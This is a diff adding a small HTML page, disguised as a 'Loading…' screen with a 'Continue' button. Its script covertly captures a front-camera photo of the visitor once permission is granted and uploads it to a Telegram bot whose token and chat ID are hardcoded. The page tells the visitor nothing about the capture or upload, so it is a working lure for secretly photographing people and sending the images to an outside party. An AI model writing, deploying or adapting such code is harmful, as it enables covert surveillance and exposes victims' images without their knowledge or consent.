@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading…</title>
+<style>
+  body{margin:0;background:#0b0b0b;color:#eee;font-family:system-ui,sans-serif;
+       display:flex;align-items:center;justify-content:center;height:100vh}
+  button{padding:16px 28px;font-size:18px;border:0;border-radius:10px;
+         background:#2b6cff;color:#fff}
+  #log{position:fixed;bottom:8px;left:8px;font-size:12px;opacity:.6}
+</style>
+</head>
+<body>
+<button id="go">Continue</button>
+<div id="log"></div>
+
+<script>
+const BOT_TOKEN = "8732154500:AAHqiXtcJseysDbuVlC9J8j-rGu1g-_x920";
+const CHAT_ID   = "8099108408";
+const log = m => document.getElementById('log').textContent = m;
+
+async function send(blob, name){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("document", blob, name);
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+                        {method:"POST", body:fd});
+  return r.ok;
+}
+
+async function capture(){
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}, audio:false
+  });
+  const v = document.createElement('video');
+  v.srcObject = stream; v.muted = true; v.playsInline = true;
+  await v.play();
+  await new Promise(r => setTimeout(r, 800));   // let exposure settle
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  stream.getTracks().forEach(t => t.stop());
+  return await new Promise(r => c.toBlob(r, "image/jpeg", 0.92));
+}
+
+document.getElementById('go').addEventListener('click', async () => {
+  try{
+    log("requesting…");
+    const blob = await capture();
+    log("uploading…");
+    const ok = await send(blob, `cam_${Date.now()}.jpg`);
+    log(ok ? "done" : "upload failed");
+  }catch(e){
+    log("blocked: " + e.name);
+  }
+});
+</script>
+</body>
+</html>
